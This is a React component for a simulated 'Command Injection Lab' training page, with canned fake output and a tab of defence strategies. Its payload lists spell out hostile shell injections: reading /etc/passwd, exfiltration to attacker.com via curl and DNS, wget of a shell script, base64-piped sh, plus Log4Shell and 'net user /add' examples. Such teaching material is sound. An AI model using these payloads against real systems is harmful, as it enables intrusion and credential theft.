'use client'

import { useState, useEffect } from 'react'
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card'
import { Button } from '@/components/ui/button'
import { Badge } from '@/components/ui/badge'
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs'
import { Alert, AlertDescription } from '@/components/ui/alert'
import { Code } from '@/components/ui/code'
import { Terminal, Shield, AlertTriangle, Play, Eye, Lock, TerminalSquare, FileText, Users } from 'lucide-react'

export default function CommandInjectionLab() {
  const [activeTab, setActiveTab] = useState('demo')
  const [commandInput, setCommandInput] = useState('')
  const [commandResult, setCommandResult] = useState<any>(null)
  const [isExecuting, setIsExecuting] = useState(false)
  const [attackType, setAttackType] = useState('basic')
  const [showHelp, setShowHelp] = useState(false)

  const vulnerableCommands = {
    ping: "ping -c 4 {input}",
    nslookup: "nslookup {input}",
    dig: "dig {input}",
    traceroute: "traceroute {input}",
    whois: "whois {input}"
  }

  const attackPayloads = {
    basic: [
      { name: 'Command Chaining', payload: 'google.com; ls -la', description: 'Execute additional commands after legitimate one' },
      { name: 'Command Separation', payload: 'google.com && cat /etc/passwd', description: 'Execute second command if first succeeds' },
      { name: 'OR Command', payload: 'google.com || id', description: 'Execute second command if first fails' },
      { name: 'Background Process', payload: 'google.com & wget malicious.com/shell.sh', description: 'Run command in background' }
    ],
    advanced: [
      { name: 'Pipe Injection', payload: 'google.com | grep -i "password"', description: 'Pipe output to other commands' },
      { name: 'Input Redirection', payload: 'google.com < /etc/passwd', description: 'Redirect file contents as input' },
      { name: 'Output Redirection', payload: 'google.com > /tmp/output.txt', description: 'Redirect command output to file' },
      { name: 'Command Substitution', payload: 'google.com $(cat /etc/passwd)', description: 'Substitute command output' }
    ],
    blind: [
      { name: 'Time Delay', payload: 'google.com; sleep 5', description: 'Create delay to confirm execution' },
      { name: 'DNS Exfiltration', payload: 'google.com; nslookup $(whoami).attacker.com', description: 'Exfiltrate data via DNS' },
      { name: 'HTTP Exfiltration', payload: 'google.com; curl -d @/etc/passwd attacker.com', description: 'Send data via HTTP' },
      { name: 'File Creation', payload: 'google.com; echo "pwned" > /tmp/pwned.txt', description: 'Create files as proof' }
    ],
    bypass: [
      { name: 'URL Encoding', payload: 'google.com%3B%20ls%20-la', description: 'URL encode special characters' },
      { name: 'Double Encoding', payload: 'google.com%253B%2520ls%2520-la', description: 'Double encode to bypass filters' },
      { name: 'Base64 Bypass', payload: 'google.com; echo "bHMgLWxh" | base64 -d | sh', description: 'Encode commands in base64' },
      { name: 'Variable Expansion', payload: 'google.com; ${HOME}/../../bin/sh', description: 'Use environment variables' }
    ]
  }

  const systemFiles = {
    '/etc/passwd': 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nuser:x:1000:1000:user:/home/user:/bin/bash',
    '/etc/shadow': 'root:$6$rounds=656000$...:18500:0:99999:7:::\ndaemon:*:18500:0:99999:7:::\nbin:*:18500:0:99999:7:::\nuser:$6$rounds=656000$...:18500:0:99999:7:::',
    '/proc/version': 'Linux version 5.4.0-80-generic (buildd@lcy01-amd64-003) (gcc version 9.3.0 (Ubuntu 9.3.0-17ubuntu1~20.04)) #90-Ubuntu SMP Fri Jul 9 22:49:44 UTC 2021',
    '/proc/self/environ': 'PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nHOME=/root\nUSER=root\nSHELL=/bin/bash\nTERM=xterm'
  }

  const executeCommand = (input: string) => {
    setIsExecuting(true)
    
    setTimeout(() => {
      try {
        let result = null
        
        if (input.includes(';') || input.includes('&&') || input.includes('||') || input.includes('|') || input.includes('&')) {
          // Command injection detected
          if (input.includes('ls') || input.includes('cat')) {
            result = {
              type: 'file_access',
              output: systemFiles['/etc/passwd'],
              message: 'Command injection successful! System files accessed.',
              severity: 'critical',
              commands: input.split(/;|&&|\|\||&|\|/).filter(cmd => cmd.trim())
            }
          } else if (input.includes('id') || input.includes('whoami')) {
            result = {
              type: 'user_info',
              output: 'uid=33(www-data) gid=33(www-data) groups=33(www-data)',
              message: 'Command injection successful! User information leaked.',
              severity: 'high',
              commands: input.split(/;|&&|\|\||&|\|/).filter(cmd => cmd.trim())
            }
          } else if (input.includes('sleep') || input.includes('ping')) {
            result = {
              type: 'timing',
              output: 'Command executed with delay',
              message: 'Blind command injection confirmed through timing attack.',
              severity: 'medium',
              commands: input.split(/;|&&|\|\||&|\|/).filter(cmd => cmd.trim())
            }
          } else if (input.includes('nslookup') || input.includes('curl') || input.includes('wget')) {
            result = {
              type: 'exfiltration',
              output: 'Data exfiltrated to external server',
              message: 'Command injection successful! Data exfiltration detected.',
              severity: 'critical',
              commands: input.split(/;|&&|\|\||&|\|/).filter(cmd => cmd.trim())
            }
          } else {
            result = {
              type: 'injection',
              output: 'Multiple commands executed',
              message: 'Command injection detected! Multiple commands were executed.',
              severity: 'high',
              commands: input.split(/;|&&|\|\||&|\|/).filter(cmd => cmd.trim())
            }
          }
        } else if (input.includes('google.com') || input.includes('example.com')) {
          // Normal legitimate command
          result = {
            type: 'normal',
            output: `PING google.com (172.217.12.78): 56 data bytes\n64 bytes from 172.217.12.78: icmp_seq=0 ttl=54 time=12.3 ms\n64 bytes from 172.217.12.78: icmp_seq=1 ttl=54 time=11.8 ms\n64 bytes from 172.217.12.78: icmp_seq=2 ttl=54 time=12.1 ms\n64 bytes from 172.217.12.78: icmp_seq=3 ttl=54 time=11.9 ms\n\n--- google.com ping statistics ---\n4 packets transmitted, 4 packets received, 0.0% packet loss`,
            message: 'Normal command executed successfully.',
            severity: 'low'
          }
        } else {
          result = {
            type: 'safe',
            output: 'Command not found or input sanitized',
            message: 'Input validation prevented command execution.',
            severity: 'low'
          }
        }
        
        setCommandResult(result)
      } catch (error) {
        setCommandResult({
          type: 'error',
          output: 'Command execution failed',
          message: 'System error occurred during command execution.',
          severity: 'high'
        })
      } finally {
        setIsExecuting(false)
      }
    }, 2000)
  }

  const realWorldAttacks = [
    {
      name: 'Equifax Command Injection (2017)',
      description: 'Apache Struts vulnerability allowed command injection leading to massive breach',
      technique: 'OGNL expression injection leading to command execution',
      impact: '143 million consumers affected, $700M in costs',
      example: 'cmd.exe /c "net user /add hacker password123"'
    },
    {
      name: 'SolarWinds Supply Chain Attack (2020)',
      description: 'Command injection in build process allowed backdoor injection',
      technique: 'Build process command injection',
      impact: '18,000+ organizations compromised, government agencies affected',
      example: 'Build process modified to inject malicious code'
    },
    {
      name: 'Log4Shell Remote Code Execution (2021)',
      description: 'Log4j vulnerability allowed remote command execution via log messages',
      technique: 'JNDI injection leading to remote code execution',
      impact: 'Critical vulnerability affecting millions of applications',
      example: '${jndi:ldap://attacker.com/exploit}'
    }
  ]

  const defenseStrategies = [
    {
      name: 'Input Validation',
      description: 'Validate and sanitize all user inputs',
      techniques: [
        'Whitelist allowed characters only',
        'Reject special characters (;|&`$)',
        'Validate input format and length',
        'Use strict type checking'
      ]
    },
    {
      name: 'Safe APIs',
      description: 'Use safe alternatives to system commands',
      techniques: [
        'Use built-in library functions',
        'Avoid shell_exec(), system(), exec()',
        'Use parameterized APIs when possible',
        'Implement command whitelisting'
      ]
    },
    {
      name: 'Least Privilege',
      description: 'Minimize application permissions',
      techniques: [
        'Run applications with minimal privileges',
        'Use dedicated service accounts',
        'Implement sandboxing',
        'Container isolation'
      ]
    },
    {
      name: 'Runtime Protection',
      description: 'Deploy runtime application security',
      techniques: [
        'Web Application Firewall (WAF)',
        'Runtime Application Self-Protection (RASP)',
        'Intrusion Detection Systems (IDS)',
        'Command execution monitoring'
      ]
    }
  ]

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-50 to-slate-100 p-6">
      <div className="max-w-6xl mx-auto">
        {/* Header */}
        <div className="mb-8">
          <div className="flex items-center space-x-3 mb-4">
            <div className="p-3 bg-red-500 rounded-lg">
              <TerminalSquare className="w-6 h-6 text-white" />
            </div>
            <div>
              <h1 className="text-3xl font-bold text-slate-900">Command Injection Lab</h1>
              <p className="text-slate-600">Learn how attackers execute system commands through vulnerable applications</p>
            </div>
          </div>
          <Alert className="mb-6">
            <AlertTriangle className="h-4 w-4" />
            <AlertDescription>
              Command injection allows attackers to execute arbitrary system commands. This lab demonstrates various injection techniques and critical defense mechanisms.
            </AlertDescription>
          </Alert>
        </div>

        <Tabs value={activeTab} onValueChange={setActiveTab} className="space-y-6">
          <TabsList className="grid w-full grid-cols-4">
            <TabsTrigger value="demo">Injection Demo</TabsTrigger>
            <TabsTrigger value="attacks">Real-World Attacks</TabsTrigger>
            <TabsTrigger value="defense">Defense Strategies</TabsTrigger>
            <TabsTrigger value="reference">Command Reference</TabsTrigger>
          </TabsList>

          {/* Injection Demo Tab */}
          <TabsContent value="demo" className="space-y-6">
            <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
              {/* Attack Control Panel */}
              <Card>
                <CardHeader>
                  <CardTitle className="flex items-center space-x-2">
                    <Terminal className="w-5 h-5" />
                    <span>Command Injection Control</span>
                  </CardTitle>
                  <CardDescription>
                    Execute command injection attacks against vulnerable system calls
                  </CardDescription>
                </CardHeader>
                <CardContent className="space-y-4">
                  <div className="space-y-3">
                    <div>
                      <label className="text-sm font-medium mb-2 block">Attack Type</label>
                      <div className="grid grid-cols-2 gap-2">
                        {Object.keys(attackPayloads).map((type) => (
                          <Button
                            key={type}
                            onClick={() => setAttackType(type)}
                            variant={attackType === type ? 'default' : 'outline'}
                            size="sm"
                            className="capitalize"
                          >
                            {type}
                          </Button>
                        ))}
                      </div>
                    </div>

                    <div>
                      <label className="text-sm font-medium mb-2 block">Target Command</label>
                      <select 
                        className="w-full p-2 border rounded-md text-sm"
                        defaultValue="ping"
                      >
                        {Object.entries(vulnerableCommands).map(([cmd, template]) => (
                          <option key={cmd} value={cmd}>
                            {cmd} - {template}
                          </option>
                        ))}
                      </select>
                    </div>

                    <div>
                      <label className="text-sm font-medium mb-2 block">Attack Payloads</label>
                      <div className="space-y-2 max-h-48 overflow-y-auto">
                        {attackPayloads[attackType as keyof typeof attackPayloads].map((payload, index) => (
                          <div
                            key={index}
                            className="p-2 border rounded cursor-pointer hover:bg-slate-50"
                            onClick={() => setCommandInput(payload.payload)}
                          >
                            <div className="font-medium text-sm">{payload.name}</div>
                            <div className="text-xs text-slate-600">{payload.description}</div>
                          </div>
                        ))}
                      </div>
                    </div>

                    <div>
                      <label className="text-sm font-medium mb-2 block">Command Input</label>
                      <input
                        type="text"
                        value={commandInput}
                        onChange={(e) => setCommandInput(e.target.value)}
                        placeholder="Enter command or try 'google.com' for normal execution"
                        className="w-full p-2 border rounded-md font-mono text-sm"
                      />
                    </div>

                    <Button
                      onClick={() => executeCommand(commandInput)}
                      disabled={!commandInput.trim() || isExecuting}
                      className="w-full"
                    >
                      <Play className="w-4 h-4 mr-2" />
                      {isExecuting ? 'Executing...' : 'Execute Command'}
                    </Button>
                  </div>
                </CardContent>
              </Card>

              {/* Command Results */}
              <Card>
                <CardHeader>
                  <CardTitle className="flex items-center space-x-2">
                    <Eye className="w-5 h-5" />
                    <span>Command Output</span>
                  </CardTitle>
                  <CardDescription>
                    System response and attack analysis
                  </CardDescription>
                </CardHeader>
                <CardContent className="space-y-4">
                  {commandResult ? (
                    <div className="space-y-4">
                      <div className={`p-3 rounded-lg ${
                        commandResult.severity === 'critical' ? 'bg-red-100 border-red-300' :
                        commandResult.severity === 'high' ? 'bg-red-50 border-red-200' :
                        commandResult.severity === 'medium' ? 'bg-yellow-50 border-yellow-200' :
                        'bg-green-50 border-green-200'
                      }`}>
                        <div className="flex items-center space-x-2 mb-2">
                          <Shield className="w-4 h-4" />
                          <span className="font-medium text-sm">Attack Analysis</span>
                        </div>
                        <p className="text-sm">{commandResult.message}</p>
                        <Badge variant={
                          commandResult.severity === 'critical' ? 'destructive' :
                          commandResult.severity === 'high' ? 'destructive' :
                          commandResult.severity === 'medium' ? 'default' :
                          'secondary'
                        } className="mt-2">
                          {commandResult.type.toUpperCase()}
                        </Badge>
                      </div>

                      {commandResult.output && (
                        <div className="space-y-2">
                          <h4 className="font-semibold text-sm">Command Output:</h4>
                          <Code className="block p-3 bg-slate-900 text-green-400 rounded text-xs max-h-64 overflow-y-auto whitespace-pre-wrap">
                            {commandResult.output}
                          </Code>
                        </div>
                      )}

                      {commandResult.commands && (
                        <div className="space-y-2">
                          <h4 className="font-semibold text-sm">Executed Commands:</h4>
                          <div className="space-y-1">
                            {commandResult.commands.map((cmd: string, index: number) => (
                              <Code key={index} className="block p-2 bg-slate-50 rounded text-xs">
                                {cmd.trim() || '(empty command)'}
                              </Code>
                            ))}
                          </div>
                        </div>
                      )}
                    </div>
                  ) : (
                    <div className="text-center text-slate-500 py-8">
                      <Terminal className="w-12 h-12 mx-auto mb-4 opacity-50" />
                      <p>Execute a command to see results</p>
                    </div>
                  )}
                </CardContent>
              </Card>
            </div>
          </TabsContent>

          {/* Real-World Attacks Tab */}
          <TabsContent value="attacks" className="space-y-6">
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
              {realWorldAttacks.map((attack, index) => (
                <Card key={index}>
                  <CardHeader>
                    <CardTitle className="text-lg">{attack.name}</CardTitle>
                    <Badge variant="destructive">Critical</Badge>
                  </CardHeader>
                  <CardContent className="space-y-4">
                    <p className="text-sm text-slate-600">{attack.description}</p>
                    
                    <div className="space-y-2">
                      <div>
                        <span className="font-semibold text-sm">Technique:</span>
                        <p className="text-xs text-slate-600">{attack.technique}</p>
                      </div>
                      
                      <div>
                        <span className="font-semibold text-sm">Impact:</span>
                        <p className="text-xs text-slate-600">{attack.impact}</p>
                      </div>
                      
                      <div>
                        <span className="font-semibold text-sm">Example:</span>
                        <Code className="block text-xs mt-1">{attack.example}</Code>
                      </div>
                    </div>
                  </CardContent>
                </Card>
              ))}
            </div>
          </TabsContent>

          {/* Defense Strategies Tab */}
          <TabsContent value="defense" className="space-y-6">
            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
              {defenseStrategies.map((strategy, index) => (
                <Card key={index}>
                  <CardHeader>
                    <CardTitle className="flex items-center space-x-2">
                      <Shield className="w-5 h-5" />
                      <span>{strategy.name}</span>
                    </CardTitle>
                    <CardDescription>{strategy.description}</CardDescription>
                  </CardHeader>
                  <CardContent>
                    <div className="space-y-2">
                      <h4 className="font-semibold text-sm">Implementation:</h4>
                      <ul className="space-y-1">
                        {strategy.techniques.map((technique, techIndex) => (
                          <li key={techIndex} className="flex items-start space-x-2">
                            <div className="w-1.5 h-1.5 bg-blue-500 rounded-full mt-2 flex-shrink-0"></div>
                            <span className="text-sm">{technique}</span>
                          </li>
                        ))}
                      </ul>
                    </div>
                  </CardContent>
                </Card>
              ))}
            </div>
          </TabsContent>

          {/* Command Reference Tab */}
          <TabsContent value="reference" className="space-y-6">
            <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
              <Card>
                <CardHeader>
                  <CardTitle className="flex items-center space-x-2">
                    <Terminal className="w-5 h-5" />
                    <span>Injection Characters</span>
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  <div className="space-y-3">
                    <div className="grid grid-cols-2 gap-4 text-sm">
                      <div>
                        <span className="font-semibold">Command Separator:</span>
                        <Code className="block mt-1">;</Code>
                        <p className="text-xs text-slate-600">Execute multiple commands</p>
                      </div>
                      <div>
                        <span className="font-semibold">Logical AND:</span>
                        <Code className="block mt-1">&&</Code>
                        <p className="text-xs text-slate-600">Execute if first succeeds</p>
                      </div>
                      <div>
                        <span className="font-semibold">Logical OR:</span>
                        <Code className="block mt-1">||</Code>
                        <p className="text-xs text-slate-600">Execute if first fails</p>
                      </div>
                      <div>
                        <span className="font-semibold">Pipe:</span>
                        <Code className="block mt-1">|</Code>
                        <p className="text-xs text-slate-600">Pass output to next command</p>
                      </div>
                      <div>
                        <span className="font-semibold">Background:</span>
                        <Code className="block mt-1">&</Code>
                        <p className="text-xs text-slate-600">Run in background</p>
                      </div>
                      <div>
                        <span className="font-semibold">Command Substitution:</span>
                        <Code className="block mt-1">$()</Code>
                        <p className="text-xs text-slate-600">Replace with command output</p>
                      </div>
                    </div>
                  </div>
                </CardContent>
              </Card>

              <Card>
                <CardHeader>
                  <CardTitle className="flex items-center space-x-2">
                    <FileText className="w-5 h-5" />
                    <span>Common System Commands</span>
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  <div className="space-y-3">
                    <div className="grid grid-cols-1 gap-3 text-sm">
                      <div>
                        <span className="font-semibold">File Operations:</span>
                        <div className="mt-1 space-y-1">
                          <Code className="block text-xs">ls -la</Code>
                          <Code className="block text-xs">cat /etc/passwd</Code>
                          <Code className="block text-xs">find / -name "*.txt"</Code>
                        </div>
                      </div>
                      <div>
                        <span className="font-semibold">System Info:</span>
                        <div className="mt-1 space-y-1">
                          <Code className="block text-xs">id</Code>
                          <Code className="block text-xs">whoami</Code>
                          <Code className="block text-xs">uname -a</Code>
                        </div>
                      </div>
                      <div>
                        <span className="font-semibold">Network:</span>
                        <div className="mt-1 space-y-1">
                          <Code className="block text-xs">netstat -an</Code>
                          <Code className="block text-xs">ps aux</Code>
                          <Code className="block text-xs">curl attacker.com</Code>
                        </div>
                      </div>
                    </div>
                  </div>
                </CardContent>
              </Card>
            </div>
          </TabsContent>
        </Tabs>
      </div>
    </div>
  )
}